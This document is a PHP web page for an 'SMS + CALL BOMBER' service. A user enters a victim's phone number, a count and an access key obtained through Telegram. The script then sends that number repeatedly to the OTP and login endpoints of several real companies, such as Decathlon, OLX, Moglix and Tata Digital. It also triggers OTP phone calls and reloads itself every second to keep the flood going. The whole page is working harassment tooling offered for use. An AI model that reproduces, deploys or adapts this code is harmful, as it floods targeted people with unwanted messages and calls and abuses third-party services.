<?php
session_start();
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    
<!-- For SEO -->

    <meta name="title" content="SMS + CALL BOMBER ">
    <meta name="description" content="It Is The Best Sms+Call BombeR Service The World. Our Service">
    <meta name="keywords" content=" SMS BOMBER + CALL BOMBER [2023]">
    <meta name="author" content="Virtual Bomb">    
    <!-- BOOTSTRAP CODE -->
    
<link rel=" stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.2/css/all.css" />


  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/5.2/assets/css/docs.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
 
    <!-- BOOTSTRAP CODE -->
    <title>Virtual Bomber</title>
    
    <style>
     *{
        margin: 0px;
        padding: 0px;
        overflow: hidden;
        text-align: center;
    }
    body{
        background-image:linear-gradient(rgba(0,0,0,0.5),rgba(0,0,0,0.5)), url(../bagr.jpg);
    height: 100vh;
    background-size: cover;
    background-position: center;
    }

    .heading{
        display: flex;
        margin-top:50px;
        margin-bottom:50px;
        height: 100px;
        justify-content: center;
        align-items: center;
    }

    .heading img{
        width: 80px;
        border-radius:50%;
        margin:10px;
    }

    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
        -webkit-appearance: none;
        margin: 0;
    }

    input[type=number] {
        -moz-appearance: textfield;
    }

    .heading h2{
      color: color:#333;;
      font-family: "Courier", monospace;
    }
    
    .form{
        display:flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;

    }
    .forminput{
        font-size: 20px;
        text-align: center;
        border-radius: 23px;
        display: block;
        margin: 13px;
    } 
    .btns{
        display: block;
        background: #0D6EFD;
        border: 0;
        border-radius:23px;
        color: white;
        font-family: Space Grotesk;
        text-transform: uppercase;
        cursor: pointer;
        margin: auto;
        margin-top: 10px;
        padding: 5px;
        font-size: 25px;
    }
    .btns:hover{
            background: #000;
        }

    .footerbar{
        color: #333;
        font-family: Space Grotesk;
        font-weight: bold;
        padding-top: 10px;
    }

        .bomb-start{
            color: #000;
            display: flex;
            padding-top: 10px;
            font-family: Space Grotesk;
            justify-content: center;
            align-items: center;
        }
        .bomb-count{
            display: flex;
            justify-content: center;
            align-items: center;
            color: red;
            padding-top: 10px;
        }
        #stop-btn{
            position: relative;
            display: inline-block;
            background:#0D6EFD;
            border-radius:23px;
            font-size: 18px;
            text-transform: uppercase;
            color: #fff;
            text-decoration: none;
            padding: 20px 30px;
            font-weight: 500;
            margin-top: 15px;
        }
        
        
    </style>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-250072968-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-250072968-1');
</script>
  </head>
  <body>
      <div class="bg-img">
    <div class="heading">
      <h2>BLACK BOMBER</h2>
    </div>
    <?php
    
    if(isset($_GET['submit'])){
    $number = $_GET['number'];
    $getlimit = $_GET['countnumber'];
    $key=$_GET['key'];
    $ky="@Black_Bomber9";
	$currentlimit=$_SESSION['limitset'];
		
    function RandomNumber($length)
{
$str="";
for($i=0;$i<$length;$i++){
$str.=mt_rand(0,9);
}
return $str;
}
$n = array('charan','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','preetham','suman','sunitha','tanu','manu','mahesh','mahendra','manoj','vikas','abhinav','arya','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','ananth','sumana','saritha','yogesh','razz');
$fname = $n[mt_rand(0,count($n))];	

$imei=RandomNumber(15);
$user=RandomNumber(21);
if($ky!= $key){
  echo'<Script>alert("Enter valid key")</Script>';
  echo "<meta http-equiv='refresh' content='1;url=./index.php'>";
  }else{
  if(file_exists("ban/$number.txt")){
  echo'<Script>alert("This Number is Protected...")</Script>';
  echo "<meta http-equiv='refresh' content='1;url=./index.php'>";
  }else{
  
if("$currentlimit" == "$getlimit"){
echo"<span class='bomb-start'>successfully Bombed ".$getlimit."</span>"; exit;}
		
/*  URL , HEADERS &  DATA     */
# CURL 

function send_bomb($url, $data, $headers)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $output = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($output, true);
}

# URL DATA HEADERS

$url1 = 'https://www.medibuddy.in/unified-login/user/register';

$data1 = '{"phonenumber":"' . $number . '"}';

$headers1 = ['www.medibuddy.in', 'Content-Type: application/json', 'Accept: application/json, text/plain, */*', 'Origin: https://www.medibuddy.in', 'Referer: https://www.medibuddy.in/', 'Accept-Encoding: gzip, deflate', 'Accept-Language: en-US,en;q=0.9'];

send_bomb($url1, $data1, $headers1);

#############################################################################

$url7 = "https://api.krishify.com/api/v1/auth/phone-login/generate";

$data7 = '{"phone_number":"' . $number . '","name":"Tetu Mama"}';

$headers7 = array(
    "Host: api.krishify.com",
    "content-length: 48",
    "accept-language: hi",
    "app-name: KRISHIFY-DEALS",
    "Content-Type: application/json",
    "accept: application/json, text/plain, */*",
    "app-version-code: 320",
    "origin: https://deals.krishify.com",
    "referer: https://deals.krishify.com/",
    "accept-encoding: gzip, deflate, br"
);

send_bomb($url7, $data7, $headers7);

#############################################################################

$url2 = 'https://www.dealshare.in/api/1.0/get-otp';

$data2 = '{"phoneNumber":"' . $number . '"}';

$headers2 = ['www.dealshare.in', 'Accept: application/json, text/plain, */*', 'Content-Type: application/json', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36', 'Origin: https://www.dealshare.in', 'Referer: https://www.dealshare.in/', 'Accept-Encoding: gzip, deflate', 'Accept-Language: en-US,en;q=0.9'];

send_bomb($url2, $data2, $headers2);

#############################################################################

$url3 = 'https://www.decathlon.in/api/login/sendotp';

$data3 = '{"param":"' . $number . '","source":1}';

$headers3 = ['Host: www.decathlon.in', 'Accept: application/json, text/plain, */*', 'Content-Type: application/json', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36', 'Origin: https://www.decathlon.in', 'Referer: https://www.decathlon.in/', 'Accept-Encoding: gzip, deflate', 'Accept-Language: en-US,en;q=0.9'];

send_bomb($url3, $data3, $headers3);

#############################################################################

$url10 = "https://ullu.app/ulluCore/api/v1/otp/send/new/cdiOpn?mobileNumber='.$number.'";

$data10 = "mobileNumber='.$number.'";

$headers10 = array(
    "Host: ullu.app",
    "content-length: 0",
    "accept: application/json, text/plain, */*",
    "origin: https://ullu.app",
    "referer: https://ullu.app/",
    "accept-encoding: gzip, deflate, br",
    "accept-language: en-US,en;q=0.9",
    "Content-Type: application/x-www-form-urlencoded"
);

send_bomb($url10, $data10, $headers10);

#############################################################################

$url11 = "https://api.tatadigital.com/api/v2/sso/check-phone";

$data11 = '{"countryCode":"91","phone":"' . $number . '","sendOtp":true}';

$headers11 = array(
    "Host: api.tatadigital.com",
    "content-length: 56",
    "accept: */*",
    "client_id: WESTSIDE-WEB-APP",
    "Content-Type: application/json",
    "origin: https://www.westside.com",
    "referer: https://www.westside.com/",
    "accept-encoding: gzip, deflate, br",
    "accept-language: en-US,en;q=0.9"
);

send_bomb($url11, $data11, $headers11);

#############################################################################

$url15 ='https://apinew.moglix.com/nodeApi/v1/login/sendOTP';

$data15 = '{"phone":"'.$number.'","email":"","type":"p","source":"signup","device":"desktop"}';

$headers15 = ['Host: apinew.moglix.com','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36','Content-Type: application/json','Accept: application/json, text/plain, */*','Origin: https://www.moglix.com','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];

send_bomb($url15, $data15, $headers15);

#############################################################################

$url_msg2 = "https://www.olx.in/api/auth/authenticate";

$data_msg2 = '{"grantType":"phone","language":"en","phone":"+91'.$number.'"}';

$headers_msg2 = array(
    "content-type: application/json"
);

send_bomb($url_msg2, $data_msg2, $headers_msg2);

$url113 = "https://api.olx.in/v2/auth/authenticate";

$data113 = '{"grantType":"retry","method":"call","phone":"+91'.$number.'"}';

$headers113 = array(
    "content-type: application/json"
);

send_bomb($url113, $data113, $headers113);

############# CALL THE FUNCTION #############


  


/**************************************/
  $_SESSION["limitset"] +="1";
  echo "<span class='bomb-start'>Bombing Start On This No. : ".$number."</span>";
  echo "<span class='bomb-count'>Call => ".$currentlimit."</span>";
  echo "<a href='index.php' id='stop-btn'>stop</a>";
  echo "<meta http-equiv='refresh' content='1'>";
}
}
}
    if(!isset($_GET['submit'])){
    session_unset();
    session_destroy();
    echo'<div class="form">
      <form action="" method="GET">
          <input class="forminput" type="number" name="number" placeholder="Enter Number" required />
          <input class="forminput"type="number" max="100" name="countnumber" value="50" placeholder="Enter No. Of Calls" required/>
          <input class="forminput" type="name" name="key" placeholder="Enter Access key" required />
          <a style="background-color: red;" class="btn btn-primary fw-bold p-2" href="//telegram.me/Black_Bomber9" > Get key<i class="fa fa-telegram"></i>
          </a>
          
        <input class="btns" type="submit" value="submit" name="submit">
      </form>
    </div>';
    }
    ?>
    </div>
    <script>
    function stopBomb(){
    }
    </script>
  </body>
</html>